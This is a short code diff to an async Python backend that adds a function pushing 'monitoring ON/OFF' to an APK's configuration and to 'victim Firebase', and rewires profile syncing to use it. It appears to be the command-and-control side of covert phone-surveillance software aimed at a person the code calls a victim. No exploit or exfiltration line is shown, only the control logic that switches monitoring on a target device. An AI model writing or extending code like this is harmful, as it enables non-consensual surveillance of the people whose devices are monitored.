@@ -414,11 +414,20 @@ async def register_device_on_firebase(
     await _firebase_put(f"{base}/devices/{device.name}", payload)
 
 
+async def publish_monitoring_state(profile: MonitorProfile, device: Device | None = None) -> None:
+    """Push monitoring ON/OFF to APK config + victim Firebase immediately."""
+    try:
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
+    except Exception as exc:
+        logger.warning("Monitoring state publish failed: %s", exc)
+
+
 async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
     if not resolve_firebase_url(profile, device):
         return
     try:
-        await push_module_config(profile, device)
+        await publish_monitoring_state(profile, device)
         if device:
             firebase_url = resolve_firebase_url(profile, device)
             if firebase_url:
